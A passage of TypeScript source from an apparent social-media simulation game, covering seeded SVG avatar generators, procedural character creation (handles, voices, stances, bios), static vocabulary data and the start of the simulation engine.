<ellipse cx="32" cy="41" rx="${cat ? 2 : 3.5}" ry="${cat ? 1.5 : 2.5}" fill="#3b2626"/>
<path d="M32 43 Q29 47 26 45 M32 43 Q35 47 38 45" stroke="#3b2626" stroke-width="1.1" fill="none"/>
${cat ? `<path d="M18 40 h-8 M18 43 l-7 2 M46 40 h8 M46 43 l7 2" stroke="#3b2626" stroke-width=".8"/>` : ""}
${!cat && r.chance(0.5) ? `<path d="M30 46 q2 6 4 0z" fill="#fb7185"/>` : ""}`);
}

function aesthetic(r: Rng) {
  const a = r.pick(["#f472b6", "#fb923c", "#a78bfa", "#38bdf8", "#facc15"]), b = r.pick(["#1e1b4b", "#312e81", "#0f172a", "#4c1d95", "#164e63"]);
  const id = `g${r.int(0, 1e6)}`;
  const mode = r.int(0, 2);
  const scene = mode === 0
    ? `<circle cx="32" cy="38" r="14" fill="#fde68a"/>${[40, 44, 48, 52].map((y, i) => `<rect x="0" y="${y}" width="64" height="${1.4 + i * 0.3}" fill="${b}"/>`).join("")}<rect x="0" y="54" width="64" height="10" fill="${b}"/>`
    : mode === 1
    ? `<circle cx="40" cy="22" r="9" fill="#f8fafc"/><circle cx="44" cy="19" r="8" fill="url(#${id})"/>${Array.from({ length: 9 }, () => `<circle cx="${r.int(2, 62)}" cy="${r.int(2, 40)}" r="${r.range(0.4, 1.1).toFixed(1)}" fill="#fff"/>`).join("")}<path d="M0 50 Q16 40 32 48 Q48 56 64 44 L64 64 L0 64Z" fill="${b}"/>`
    : `<path d="M0 64 L20 30 L32 44 L44 24 L64 64Z" fill="${b}" opacity=".85"/><path d="M14 40 l6 -10 l6 8z" fill="#fff" opacity=".6"/><circle cx="50" cy="14" r="5" fill="#fff" opacity=".85"/>`;
  return `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64"><defs><linearGradient id="${id}" x1="0" y1="0" x2="0" y2="1"><stop offset="0" stop-color="${b}"/><stop offset="1" stop-color="${a}"/></linearGradient></defs><rect width="64" height="64" fill="url(#${id})"/>${scene}</svg>`;
}

function pixel(r: Rng) {
  const bg = r.pick(["#638596", "#95554f", "#76a37d", "#c9a227", "#8e6fb3", "#5b7db1"]);
  const skin = r.pick(["#dbb180", "#ae8b61", "#713f1d", "#e8d0ff", "#9be070", "#c8fbfb"]);
  const hairC = r.pick(HAIR);
  const cells: string[] = [];
  const s = 4; // 16x16 grid at 4px
  const px = (x: number, y: number, c: string) => cells.push(`<rect x="${x * s}" y="${y * s}" width="${s}" height="${s}" fill="${c}"/>`);
  for (let y = 4; y < 16; y++) for (let x = 5; x < 12; x++) if (!(y > 12 && (x < 6 || x > 10))) px(x, y, skin);
  const hairStyle = r.int(0, 3);
  for (let x = 4; x < 13; x++) {
    if (hairStyle === 0) { px(x, 3, hairC); px(x, 4, hairC); }
    if (hairStyle === 1 && x % 2 === 0) { px(x, 2, hairC); px(x, 3, hairC); }
    if (hairStyle === 2) { px(x, 3, hairC); if (x < 6 || x > 10) for (let y = 4; y < 12; y++) px(x, y, hairC); }
  }
  if (hairStyle === 3) for (let x = 5; x < 12; x++) px(x, 3, "#222");
  if (r.chance(0.35)) { for (let x = 5; x < 12; x++) px(x, 7, "#111"); px(6, 8, "#111"); px(9, 8, "#111"); }
  else { px(7, 8, "#111"); px(10, 8, "#111"); }
  px(8, 10, "rgba(0,0,0,.25)");
  px(7, 12, "#5a2e2e"); px(8, 12, "#5a2e2e"); px(9, 12, "#5a2e2e");
  if (r.chance(0.3)) { px(12, 12, "#bbb"); px(13, 12, "#bbb"); px(14, 11, "#ddd"); }
  return `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64" shape-rendering="crispEdges"><rect width="64" height="64" fill="${bg}"/>${cells.join("")}</svg>`;
}

function meme(r: Rng) {
  const bg = r.pick(["#fef08a", "#e2e8f0", "#fca5a5", "#a7f3d0", "#ffffff"]);
  const face = r.pick(["#facc15", "#f5d0a9", "#a3e635", "#fda4af"]);
  const v = r.int(0, 3);
  const eyes = v === 0 ? `<rect x="14" y="26" width="16" height="7" rx="2" fill="#111"/><rect x="34" y="26" width="16" height="7" rx="2" fill="#111"/><rect x="29" y="28" width="6" height="2" fill="#111"/>`
    : v === 1 ? `<circle cx="22" cy="28" r="7" fill="#fff" stroke="#111"/><circle cx="44" cy="30" r="4" fill="#fff" stroke="#111"/><circle cx="24" cy="30" r="2.4" fill="#111"/><circle cx="43" cy="31" r="1.6" fill="#111"/>`
    : v === 2 ? `<path d="M16 28 q6 -6 12 0 M36 28 q6 -6 12 0" stroke="#111" stroke-width="2.4" fill="none"/><path d="M18 31 q-2 8 -4 12 M46 31 q2 8 4 12" stroke="#60a5fa" stroke-width="3" fill="none" stroke-linecap="round"/>`
    : `<circle cx="24" cy="29" r="3" fill="#111"/><circle cx="40" cy="29" r="3" fill="#111"/>`;
  const mouth = v === 2 ? `<path d="M20 40 Q32 54 44 40Z" fill="#7f1d1d"/>` : v === 3 ? `<rect x="22" y="40" width="20" height="3" rx="1.5" fill="#111"/>` : `<path d="M22 42 Q32 ${r.chance(0.5) ? 48 : 38} 42 42" stroke="#111" stroke-width="2.4" fill="none"/>`;
  return wrap(bg, `<circle cx="32" cy="34" r="22" fill="${face}" stroke="#111" stroke-width="1.5"/>${eyes}${mouth}${r.chance(0.3) ? `<text x="32" y="62" font-size="7" font-family="Impact,Arial Black,sans-serif" text-anchor="middle" fill="#111">${r.pick(["OK", "BRUH", "LOL", "NO", "W", "L"])}</text>` : ""}`);
}

function game(r: Rng) {
  const bg = r.pick(["#0f172a", "#111827", "#1e1b4b", "#052e16", "#3f0d12"]);
  const armor = r.pick(["#22d3ee", "#a3e635", "#f97316", "#e11d48", "#a78bfa", "#facc15", "#94a3b8"]);
  const visor = r.pick(["#fde047", "#67e8f9", "#f472b6", "#4ade80", "#f87171"]);
  const horns = r.chance(0.3) ? `<path d="M14 22 L8 6 L22 18Z M50 22 L56 6 L42 18Z" fill="${armor}" opacity=".9"/>` : "";
  return wrap(bg, `${horns}<path d="M12 34 Q12 12 32 12 Q52 12 52 34 L48 52 L16 52Z" fill="${armor}"/>
<path d="M18 30 Q32 ${r.chance(0.5) ? 24 : 28} 46 30 L44 38 Q32 42 20 38Z" fill="${visor}"/><path d="M22 31 l6 -2" stroke="#fff" stroke-width="1.5" opacity=".7"/>
<rect x="26" y="44" width="12" height="3" rx="1" fill="${bg}" opacity=".5"/>
${Array.from({ length: 6 }, (_, i) => `<circle cx="${8 + i * 10}" cy="${58 + (i % 2)}" r=".8" fill="${visor}"/>`).join("")}`);
}

function monogram(r: Rng, letter: string) {
  const bg = r.pick(BOLD);
  return wrap(bg, `<text x="32" y="43" font-size="30" font-weight="700" font-family="Georgia,serif" text-anchor="middle" fill="#fff">${letter.toUpperCase()}</text>`);
}

function abstract(r: Rng) {
  const bg = r.pick(["#0b1020", "#fafaf9", "#1c1917", "#172554"]);
  const shapes = Array.from({ length: r.int(3, 6) }, () => {
    const c = r.pick(BOLD), x = r.int(4, 60), y = r.int(4, 60), s = r.int(8, 26);
    return r.chance(0.5) ? `<circle cx="${x}" cy="${y}" r="${s / 2}" fill="${c}" opacity=".85"/>` : `<rect x="${x - s / 2}" y="${y - s / 2}" width="${s}" height="${s}" fill="${c}" opacity=".8" transform="rotate(${r.int(0, 90)} ${x} ${y})"/>`;
  });
  return wrap(bg, shapes.join(""));
}

/** original hooded figure with a glowing visor; seed picks glow color, mask and glitch bars */
function hacker(r: Rng) {
  const glow = r.pick(["#39ff88", "#22d3ee", "#e8b84a", "#f43f5e", "#a78bfa"]);
  const bg = r.pick(["#07090d", "#0b1010", "#0d0a14", "#101014"]);
  const mask = r.int(0, 2);
  const face = mask === 0
    ? `<rect x="22" y="31" width="20" height="5" rx="2.5" fill="${glow}"/><rect x="22" y="31" width="20" height="5" rx="2.5" fill="${glow}" opacity=".35" filter="url(#hb)"/>`
    : mask === 1
      ? `<circle cx="27" cy="34" r="2.6" fill="${glow}"/><circle cx="37" cy="34" r="2.6" fill="${glow}"/><path d="M26 42 h12" stroke="${glow}" stroke-width="1.6" stroke-linecap="round" opacity=".7"/>`
      : `<path d="M23 33 l5 -2 l0 4z M41 33 l-5 -2 l0 4z" fill="${glow}"/><path d="M27 41 q5 3 10 0" stroke="${glow}" stroke-width="1.4" fill="none"/>`;
  const bars = Array.from({ length: r.int(2, 4) }, () => `<rect x="${r.int(0, 40)}" y="${r.int(6, 58)}" width="${r.int(8, 24)}" height="${r.int(1, 3)}" fill="${glow}" opacity="${r.pick([0.25, 0.4, 0.55])}"/>`).join("");
  return wrap(bg, `<defs><filter id="hb"><feGaussianBlur stdDeviation="2"/></filter></defs>
<path d="M10 64 Q10 40 18 26 Q24 12 32 12 Q40 12 46 26 Q54 40 54 64Z" fill="#161a22"/>
<path d="M18 46 Q18 26 32 24 Q46 26 46 46 Q40 52 32 52 Q24 52 18 46Z" fill="#050608"/>
${face}${bars}`);
}

const cache = new Map<string, string>();

export function avatarSvg(style: PfpStyle, seed: number, name = "?"): string {
  const key = `${style}|${seed}|${name[0]}`;
  const hit = cache.get(key);
  if (hit) return hit;
  const r = new Rng(seed);
  const svg = style === "anime" ? anime(r) : style === "default" ? defaultPfp(r) : style === "pet" ? pet(r) : style === "aesthetic" ? aesthetic(r)
    : style === "pixel" ? pixel(r) : style === "meme" ? meme(r) : style === "game" ? game(r) : style === "monogram" ? monogram(r, name.replace(/[^a-z]/gi, "")[0] ?? "?") : style === "hacker" ? hacker(r) : abstract(r);
  cache.set(key, svg);
  return svg;
}

export const avatarUri = (style: PfpStyle, seed: number, name?: string) => `data:image/svg+xml;utf8,${encodeURIComponent(avatarSvg(style, seed, name))}`;

/** @god's avatar: gold crown sigil. */
export const GOD_AVATAR = `data:image/svg+xml;utf8,${encodeURIComponent(`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64"><defs><linearGradient id="gg" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#fff3c4"/><stop offset=".5" stop-color="#e8b84a"/><stop offset="1" stop-color="#8a6416"/></linearGradient></defs><rect width="64" height="64" fill="#0a0a0f"/><path d="M14 42 L12 20 L23 30 L32 14 L41 30 L52 20 L50 42Z" fill="url(#gg)"/><rect x="14" y="44" width="36" height="6" rx="2" fill="url(#gg)"/><circle cx="32" cy="34" r="3" fill="#0a0a0f"/></svg>`)}`;

```

## src/lib/sim/characters.ts
```ts
import { Rng } from "./rng";
import type { Character, Chronotype, PfpStyle, Stance, Tier, Voice } from "./types";
import {
  CATCHPHRASES, EMOJI_HYPE, EMOJI_LAUGH, EMOJI_SHADE, EMOJI_SOFT, FINANCES, FIRST, INTERESTS, LOCATIONS, OCCUPATIONS, PERSONALITY,
  SLANG_MILLENNIAL, SLANG_ZOOMER, WORDS_GAME, WORDS_HARD, WORDS_SOFT, WORDS_THING,
} from "./data";

export const STANCE_INFO: Record<Stance, { label: string; color: string; base: number }> = {
  worshipper: { label: "Worshipper", color: "#e8b84a", base: 85 },
  fan: { label: "Fan", color: "#facc15", base: 45 },
  memer: { label: "Meme-maker", color: "#38bdf8", base: 15 },
  analyst: { label: "Analyst", color: "#22d3ee", base: 5 },
  skeptic: { label: "Skeptic", color: "#a3a3a3", base: -25 },
  hater: { label: "Hater", color: "#ef4444", base: -75 },
  jealous: { label: "Jealous", color: "#f97316", base: -35 },
  conspiracist: { label: "Conspiracist", color: "#a855f7", base: -10 },
  indifferent: { label: "Indifferent", color: "#64748b", base: 0 },
};

export const STANCE_WEIGHTS: [Stance, number][] = [
  ["worshipper", 14], ["fan", 18], ["memer", 13], ["analyst", 8], ["skeptic", 11], ["hater", 9], ["jealous", 7], ["conspiracist", 5], ["indifferent", 15],
];

const PFP_WEIGHTS: [PfpStyle, number][] = [
  ["anime", 24], ["default", 14], ["pet", 14], ["aesthetic", 12], ["pixel", 9], ["meme", 8], ["game", 8], ["monogram", 6], ["abstract", 5],
];

function pickWeighted<T>(rng: Rng, items: [T, number][], adjust: (t: T) => number = () => 1): T {
  return rng.weighted(items, ([t, w]) => w * adjust(t))[0];
}

const leet = (s: string) => s.replace(/[aeio]/g, (c) => ({ a: "4", e: "3", i: "1", o: "0" })[c] ?? c);

/** Handle conventions from docs/research.md §6: forced lowercase, a–z 0–9 _ . only. */
export function makeHandle(rng: Rng, first: string, age: number, stance: Stance, interests: string[]): string {
  const year = String(new Date(2026, 0, 1).getFullYear() - age).slice(rng.chance(0.5) ? 2 : 0);
  const hard = rng.pick(WORDS_HARD), soft = rng.pick(WORDS_SOFT), thing = rng.pick(WORDS_THING), game = rng.pick(WORDS_GAME);
  const theme = interests.includes("crypto") || interests.includes("memecoins") ? hard : interests.includes("gaming") ? game : rng.chance(0.5) ? soft : thing;
  const patterns: (() => string)[] = [
    () => `${first}${year}`,
    () => `${first}_${theme}`,
    () => `${theme}${first}`,
    () => `${first}.${rng.pick(SURN)}`,
    () => `${soft}${thing}`,
    () => `${theme}_${thing}${rng.chance(0.4) ? rng.int(1, 99) : ""}`,
    () => `not${first}`,
    () => `its${first}${rng.chance(0.5) ? "x" : ""}`,
    () => `the${theme}${rng.pick(["guy", "girl", "kid", "lord", "enjoyer"])}`,
    () => `real${first}${rng.int(1, 999)}`,
    () => leet(`${first}${theme}`),
    () => `${first[0]}${first}${first[first.length - 1]}`,
    () => `${theme}${theme[theme.length - 1]}`,
    () => `${first}${rng.pick(["x", "xo", "_", "z", "y"])}`,
    () => `${theme}.${theme === hard ? "eth" : rng.pick(["exe", "wav", "png", "jpg"])}`,
    () => (stance === "hater" ? `god${rng.pick(["ismid", "isoverrated", "watchdog", "skeptic"])}${rng.int(1, 99)}` : `${theme}${rng.int(100, 9999)}`),
    () => (stance === "worshipper" ? `${rng.pick(["godsfav", "godstan", "glazeking", "godfan"])}${rng.chance(0.5) ? rng.int(1, 99) : "_" + first}` : `${first}${thing}`),
  ];
  return rng.pick(patterns)().toLowerCase().replace(/[^a-z0-9_.]/g, "").replace(/\.\.+/g, ".").slice(0, 24);
}
const SURN = ["exe", "png", "wav", "irl", "ok", "eth", "sol", "xyz", "fm", "zip"];

function displayFor(rng: Rng, first: string, handle: string, voice: Voice, emojis: string[]): string {
  const cap = first[0].toUpperCase() + first.slice(1);
  const styles: (() => string)[] = [
    () => cap,
    () => `${cap} ${String.fromCharCode(65 + rng.int(0, 25))}.`,
    () => handle,
    () => `${first} ${emojis[0]}`,
    () => `${cap} | ${rng.pick(["NFA", "he/him", "she/her", "they/them", "🇺🇸", "🇩🇪", "🇬🇧", "🇧🇷", "BTC", "gym", "artist"])}`,
    () => `xX_${cap}_Xx`,
    () => cap.toUpperCase(),
    () => `${cap} ${rng.pick(["✨", "🌙", "🐸", "💎", "🎮", "☁️"])}`,
    () => `${rng.pick(["lil", "big", "sir", "lady", "dr", "king", "queen"])} ${first}`,
  ];
  const w = voice === "boomer" || voice === "formal" ? [0, 1, 0] : undefined;
  return w ? rng.pick([cap, `${cap} ${String.fromCharCode(65 + rng.int(0, 25))}.`]) : rng.pick(styles)();
}

function voiceFor(rng: Rng, age: number, stance: Stance): Voice {
  const w: [Voice, number][] =
    age < 23 ? [["zoomer", 45], ["lowercase", 22], ["caps", 9], ["emoji", 10], ["terse", 10], ["millennial", 4]]
    : age < 32 ? [["lowercase", 28], ["zoomer", 22], ["millennial", 18], ["proper", 10], ["terse", 10], ["caps", 6], ["emoji", 6]]
    : age < 45 ? [["millennial", 35], ["proper", 25], ["lowercase", 15], ["terse", 12], ["formal", 8], ["caps", 5]]
    : [["boomer", 40], ["proper", 30], ["formal", 15], ["millennial", 10], ["caps", 5]];
  return pickWeighted(rng, w, (v) => (stance === "analyst" && (v === "formal" || v === "proper") ? 3 : stance === "worshipper" && (v === "caps" || v === "emoji") ? 2 : 1));
}

export interface CharOpts {
  influencer?: boolean;
  celebField?: string;
  celebIndex?: number;
}
const CELEB_SURNAMES = ["Vale", "Rook", "Starr", "Okonjo", "Lindqvist", "Marlowe", "Kade", "Solberg", "Arden", "Voss", "Navarro", "Quill", "Ashby", "Montclair", "Reyes-Hart", "Delacroix", "Ivers", "Thorne", "Castellan", "Wilde", "Haskell", "Moreau", "Strand", "Okoro"];

export function makeCharacter(rng: Rng, idx: number, usedHandles: Set<string>, opts: CharOpts = {}): Character {
  const first = FIRST[rng.int(0, FIRST.length - 1)];
  const stance = pickWeighted(rng, STANCE_WEIGHTS);
  const ageRoll = rng.next();
  const age = opts.celebField ? rng.int(22, 46) : ageRoll < 0.38 ? rng.int(16, 22) : ageRoll < 0.75 ? rng.int(23, 31) : ageRoll < 0.92 ? rng.int(32, 44) : rng.int(45, 67);
  const loc = rng.pick(LOCATIONS);
  const occ = rng.weighted(OCCUPATIONS, (o) => (age < 20 && o.band > 2 ? 0.1 : age > 40 && o.job.includes("student") ? 0 : 1));
  const band = Math.max(0, Math.min(5, occ.band + (rng.chance(0.15) ? 1 : 0) - (rng.chance(0.15) ? 1 : 0)));
  const interests = rng.shuffle([...INTERESTS]).slice(0, rng.int(2, 4));
  let handle = makeHandle(rng, first, age, stance, interests);
  while (usedHandles.has(handle) || handle.length < 3) handle = `${handle}${rng.int(0, 9)}`;
  usedHandles.add(handle);
  const voice = voiceFor(rng, age, stance);
  const emojiPool = stance === "hater" || stance === "jealous" || stance === "skeptic" ? EMOJI_SHADE : stance === "worshipper" || stance === "fan" ? EMOJI_HYPE : EMOJI_LAUGH;
  const emojis = [rng.pick(emojiPool), rng.pick(EMOJI_LAUGH), rng.pick(rng.chance(0.3) ? EMOJI_SOFT : emojiPool)];
  const slangPool = voice === "zoomer" || voice === "lowercase" || voice === "terse" || voice === "emoji" || voice === "caps" ? SLANG_ZOOMER : SLANG_MILLENNIAL;
  const slang = rng.shuffle([...slangPool]).slice(0, rng.int(3, 6));
  const tierRoll = rng.next();
  const tier: Tier = opts.influencer ? "power" : tierRoll < 0.7 ? "lurker" : tierRoll < 0.92 ? "regular" : "power";
  // Zipf-ish weight inside each tier (research §3)
  const activity = (tier === "lurker" ? 0.15 : tier === "regular" ? 1 : rng.range(6, 12)) * (1 / Math.pow(rng.range(1, 3), 0.8));
  const chronotype: Chronotype = rng.weighted<Chronotype>(["morning", "evening", "owl"], (c) => (c === "morning" ? (age > 35 ? 4 : 2) : c === "evening" ? 5 : age < 25 ? 3 : 1));
  const pfp = pickWeighted(rng, PFP_WEIGHTS, (s) =>
    (stance === "hater" && (s === "default" || s === "meme") ? 2.2 : 1) *
    (interests.includes("crypto") || interests.includes("memecoins") ? (s === "pixel" ? 3 : 1) : 1) *
    (interests.includes("anime") && s === "anime" ? 2.5 : 1) *
    (interests.includes("gaming") && s === "game" ? 2.5 : 1) *
    (opts.influencer ? (s === "aesthetic" || s === "anime" ? 2 : s === "default" ? 0 : 1) : 1) *
    (age > 45 && (s === "monogram" || s === "pet" || s === "default") ? 2 : 1),
  );
  const personality = rng.shuffle([...PERSONALITY]).slice(0, 3);
  const influencer = !!opts.influencer;
  const followers = influencer ? Math.round(rng.range(80_000, 9_000_000)) : Math.round(Math.pow(10, rng.range(1.2, tier === "power" ? 4.6 : 3.4)));
  const display = displayFor(rng, first, handle, voice, emojis);
  const baseOp = STANCE_INFO[stance].base;
  const char: Character = {
    id: `c${idx}`,
    username: handle,
    displayName: opts.celebField ? `${first[0].toUpperCase()}${first.slice(1)} ${CELEB_SURNAMES[((opts.celebIndex ?? 0) * 7 + rng.int(0, 1)) % CELEB_SURNAMES.length]}` : display,
    avatarSeed: rng.int(1, 2 ** 30),
    age,
    location: loc.name,
    tz: loc.tz,
    occupation: opts.celebField ?? (influencer ? rng.pick(["content creator", "streamer", "finance influencer", "lifestyle creator", "podcast host", "commentary channel"]) : occ.job),
    finances: FINANCES[influencer ? Math.max(band, 3) : band],
    netWorthBand: influencer ? Math.max(band, 3) : band,
    personality,
    stance,
    opinion: Math.max(-100, Math.min(100, Math.round(baseOp + rng.range(-15, 15)))),
    voice,
    emojiRate: voice === "emoji" ? 0.85 : voice === "formal" || voice === "boomer" ? 0.08 : rng.range(0.15, 0.55),
    typoRate: voice === "formal" ? 0.01 : voice === "zoomer" || voice === "lowercase" ? rng.range(0.04, 0.14) : rng.range(0.01, 0.06),
    slang,
    emojis,
    pfp,
    tier,
    activity,
    chronotype,
    nicknames: {},
    catchphrase: rng.pick(CATCHPHRASES),
    interests,
    servers: [],
    friends: [],
    rivals: [],
    verified: influencer || (tier === "power" && rng.chance(0.05)),
    influencer,
    followers,
    bio: "",
    memory: [],
    postCount: 0,
  };
  char.bio = makeBio(rng, char);
  return char;
}

function makeBio(rng: Rng, c: Character): string {
  const bits = [
    `${c.occupation}`,
    c.location.split(",")[0],
    rng.pick(c.interests),
    c.catchphrase,
    c.stance === "worshipper" ? "god's #1 fan" : c.stance === "hater" ? "not impressed" : c.stance === "analyst" ? "numbers > vibes" : c.stance === "conspiracist" ? "ask questions" : c.stance === "memer" ? "i make the memes" : "",
    `${c.age}`,
  ].filter(Boolean);
  const sep = rng.pick([" | ", " · ", " • ", " / "]);
  const s = rng.shuffle(bits).slice(0, rng.int(2, 4)).join(sep);
  return c.voice === "zoomer" || c.voice === "lowercase" ? s.toLowerCase() : s;
}

```

## src/lib/sim/data.ts
```ts
/** Static vocab for procedural generation. All names are generic / invented. */

export const FIRST = [
  "jake","mia","leo","zara","noah","ivy","kai","luna","eli","nina","omar","sofia","theo","maya","ezra","aria","finn","lena","jonas","yara",
  "malik","chloe","diego","hana","ravi","amara","tobi","freya","milo","sasha","ari","kenji","nadia","felix","priya","otto","imani","luca","rosa","dev",
  "jade","marco","selin","axel","noor","bruno","talia","rhys","keiko","dante","esme","kofi","lea","sami","vera","jules","ines","cole","mira","hugo",
  "tariq","elin","rory","asha","bastian","nell","quinn","remy","suki","wes","zoe","andre","bea","cyrus","dina","emil","farah","gus","hiro","isla",
] as const;

export const SURNAME_BITS = ["", "", "", "k", "m", "v", "r", "s", "b", "t"] as const;

export const WORDS_SOFT = ["lunar","velvet","honey","cloud","moth","pixel","soft","dusk","neon","static","cherry","mint","ghost","echo","fern","plum","glow","haze","nova","koi","frost","peach","ink","drift","sol","wisp","opal","moss","rain","ember"];
export const WORDS_HARD = ["grind","stack","bag","chart","whale","degen","alpha","sigma","based","ratio","cope","goblin","rizz","drip","gains","pump","hodl","gwei","candle","wick","rekt","moon","sniper","lambo","flip","bull","bear","yield","floor","mint"];
export const WORDS_GAME = ["frag","noob","tilt","clutch","lag","speedrun","sweat","respawn","loot","grief","raid","combo","crit","aggro","nerf","buff","pog","gg","afk","tryhard"];
export const WORDS_THING = ["toast","bean","waffle","gremlin","possum","raccoon","noodle","pickle","spoon","goose","biscuit","taco","yeti","otter","crumb","sock","dumpling","muffin","pigeon","walrus"];

export const LOCATIONS: { name: string; tz: number }[] = [
  { name: "Berlin, DE", tz: 1 }, { name: "Hamburg, DE", tz: 1 }, { name: "Munich, DE", tz: 1 }, { name: "London, UK", tz: 0 }, { name: "Manchester, UK", tz: 0 },
  { name: "Paris, FR", tz: 1 }, { name: "Amsterdam, NL", tz: 1 }, { name: "Stockholm, SE", tz: 1 }, { name: "Madrid, ES", tz: 1 }, { name: "Milan, IT", tz: 1 },
  { name: "Warsaw, PL", tz: 1 }, { name: "Lisbon, PT", tz: 0 }, { name: "Dubai, AE", tz: 4 }, { name: "Istanbul, TR", tz: 3 }, { name: "Lagos, NG", tz: 1 },
  { name: "Nairobi, KE", tz: 3 }, { name: "Mumbai, IN", tz: 5.5 }, { name: "Singapore", tz: 8 }, { name: "Manila, PH", tz: 8 }, { name: "Seoul, KR", tz: 9 },
  { name: "Tokyo, JP", tz: 9 }, { name: "Sydney, AU", tz: 11 }, { name: "New York, US", tz: -5 }, { name: "Miami, US", tz: -5 }, { name: "Atlanta, US", tz: -5 },
  { name: "Chicago, US", tz: -6 }, { name: "Austin, US", tz: -6 }, { name: "Denver, US", tz: -7 }, { name: "Los Angeles, US", tz: -8 }, { name: "Seattle, US", tz: -8 },
  { name: "Toronto, CA", tz: -5 }, { name: "Vancouver, CA", tz: -8 }, { name: "Mexico City, MX", tz: -6 }, { name: "São Paulo, BR", tz: -3 }, { name: "Buenos Aires, AR", tz: -3 },
  { name: "Johannesburg, ZA", tz: 2 }, { name: "Vienna, AT", tz: 1 }, { name: "Zurich, CH", tz: 1 }, { name: "Dublin, IE", tz: 0 }, { name: "Oslo, NO", tz: 1 },
];

export const OCCUPATIONS: { job: string; band: number }[] = [
  { job: "CS student", band: 0 }, { job: "high school senior", band: 0 }, { job: "barista", band: 0 }, { job: "warehouse picker", band: 1 }, { job: "delivery rider", band: 0 },
  { job: "junior dev", band: 2 }, { job: "UX designer", band: 2 }, { job: "nurse", band: 2 }, { job: "teacher", band: 2 }, { job: "electrician", band: 2 },
  { job: "full-time crypto trader", band: 3 }, { job: "day trader (losing)", band: 1 }, { job: "streamer", band: 2 }, { job: "video editor", band: 1 }, { job: "unemployed", band: 0 },
  { job: "real-estate agent", band: 3 }, { job: "startup founder", band: 3 }, { job: "VC associate", band: 3 }, { job: "hedge fund analyst", band: 4 }, { job: "dentist", band: 3 },
  { job: "tattoo artist", band: 1 }, { job: "freelance journalist", band: 1 }, { job: "car dealer", band: 3 }, { job: "lawyer", band: 4 }, { job: "retired accountant", band: 3 },
  { job: "uber driver", band: 1 }, { job: "music producer", band: 1 }, { job: "esports coach", band: 1 }, { job: "pharmacist", band: 3 }, { job: "line cook", band: 0 },
  { job: "yacht broker", band: 4 }, { job: "family-office heir", band: 5 }, { job: "self-made SaaS millionaire", band: 5 }, { job: "influencer manager", band: 2 }, { job: "security guard", band: 1 },
  { job: "PhD candidate", band: 1 }, { job: "graphic designer", band: 1 }, { job: "mechanic", band: 1 }, { job: "financial advisor", band: 3 }, { job: "NFT artist", band: 1 },
];

export const FINANCES = ["broke", "living paycheck to paycheck", "doing ok", "comfortable", "quietly rich", "absurdly rich"] as const;

export const PERSONALITY = [
  "sarcastic","loyal","chronically online","anxious","hype","dry","petty","wholesome","contrarian","nerdy","dramatic","chill","competitive","curious","cynical",
  "gossipy","earnest","unhinged","stoic","flirty","paranoid","generous","cocky","shy","goofy","pedantic","romantic","impulsive","meticulous","nostalgic",
];

export const INTERESTS = ["crypto","memecoins","gaming","fashion","cars","jets","islands","business","tech","celebrity","drama","music","fitness","anime","real-estate","stocks","art","food","football","conspiracy"];

/** Shorthand per voice family (from docs/research.md §2). */
export const SLANG_ZOOMER = ["fr","fr fr","ong","ngl","lowkey","no cap","istg","bet","mid","iykyk","deadass","bro","bruh","nah","icl","on god","ts","pmo","gng","ate"];
export const SLANG_MILLENNIAL = ["lol","tbh","imo","omg","literally","lmao","smh","tbf","idk","same","mood","yikes","rn","btw"];
export const SLANG_BOOMER = ["...", "Interesting.", "LOL", "Well", "Folks", "In my day", "Hmm."];

export const EMOJI_LAUGH = ["💀","😭","💀💀","😭😭😭","💀😭","🤣","😂"];
export const EMOJI_HYPE = ["🔥","🐐","👑","💯","🚀","⚡","🙌","💎","🤑","😤"];
export const EMOJI_SHADE = ["🤡","🧢","🙄","😬","🥱","👀","🫠","🤨","📉","🗑️"];
export const EMOJI_SOFT = ["✨","🥺","🫶","🌙","☁️","🌸","💫","🤍"];

export const REACTIONS: Record<string, string[]> = {
  hacker: ["👁️", "🕸️", "💀", "📁", "🔥", "😭", "🤫"],
  glaze: ["🐐","👑","🔥","😭","💯","🙏","⚡"],
  hater: ["🤡","🧢","💀","🙄","📉","🗑️","😂"],
  finance: ["📈","📉","🤑","💰","🧐","👀","🔥"],
  culture: ["💀","😭","👀","🍿","🔥","🫠","😂"],
  gaming: ["💀","🎮","gg","🔥","😭","🫡","🤓"],
  luxury: ["🥂","💎","✈️","🏝️","🔥","👀","🤌"],
  conspiracy: ["👁️","🤔","🧠","👀","🚨","🔺","🤨"],
  gossip: ["👀","🍿","😭","💅","☕","🫢","💀"],
  news: ["👀","📰","😮","🤔","🔥","🧐","📉"],
};

export const CATCHPHRASES = [
  "we are so back","it's so over","trust the process","i'm just saying","cope harder","zoom out","source: trust me","not financial advice","let him cook","touch grass",
  "average enjoyer","main character energy","i called it","this is the timeline","emotional damage","ratio","stay humble","bullish on vibes","it's giving","no thoughts just vibes",
  "receipts or it didn't happen","ok but hear me out","i'm calm i'm calm","this aged well","certified moment","lmk if u need alpha","we ride at dawn","all gas no brakes",
];

export const CELEB_FIELDS = ["pop star","pro gamer","tech founder","rapper","fashion mogul","streamer","football star","crypto fund manager","film director","reality TV star","chef","racing driver"];

```

## src/lib/sim/engine.ts
```ts
import { Rng, rngFor } from "./rng";
import type { Article, ArticleKind, CatchUpSummary, Channel, Character, InteractiveEvent, Message, Notification, PlatformId, Post, Reaction, Server, Topic, WorldState } from "./types";
import { getGenerator, type Intent } from "./generator";
import { REACTIONS } from "./data";
import { BOT_LINES } from "./templates";
import { expand } from "./grammar";
import { actionDef, autoGodTopic, magnitudeFor, tagify, worldTopic, type ActionKind } from "./topics";
import { EVENT_DEFS } from "./events";
import { charById, netWorth } from "./world";
import { fmtMoney } from "./format";
import { STRICT_BEATS } from "./servers";
import { ambientDm, godSpeak, handleBus } from "./godspeak";
import { undernetBus, undernetOnAction, undernetTick, type EngineHooks } from "./undernet";
import { reactCascade, voiceTick } from "./presence";
import { makeMeme, MEME_LINES, type MemeSpec } from "./memes";

export const BUCKET = 10_000;
const MIN = 60_000, HOUR = 3_600_000, DAY = 86_400_000;
export const EPISODES_PER_HOUR = 105;
export const POSTS_PER_HOUR = 70;
export const MAX_FULL_SIM = 24 * HOUR;

// ---------- rhythm (docs/research.md §4) ----------
const bump = (h: number, mu: number, sd: number) => {
  let d = Math.abs(h - mu);
  d = Math.min(d, 24 - d);
  return Math.exp(-(d * d) / (2 * sd * sd));
};
